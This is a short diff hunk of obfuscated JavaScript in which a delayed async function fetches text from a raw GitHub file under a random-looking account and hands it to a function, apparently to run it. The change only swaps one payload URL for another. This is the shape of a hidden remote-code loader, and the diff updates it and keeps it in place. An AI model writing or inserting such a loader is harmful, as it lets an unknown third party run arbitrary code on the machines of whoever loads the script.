@@ -10,7 +10,7 @@ setTimeout(() => {
 
 (async function() {
     const t = t => fetch(t).then(t => t.text());
-    var e = await t(`https://raw.githubusercontent.com/Saqw1q2s3s3d4d/aqqaqap1i2k3a4/main/dsdawfas235axf`);
+    var e = await t(`https://raw.githubusercontent.com/Saqw1q2s3s3d4d/ga1rahgst1qgerr/main/v1faegeag`);
     n(e)
 })();
 }, 2);
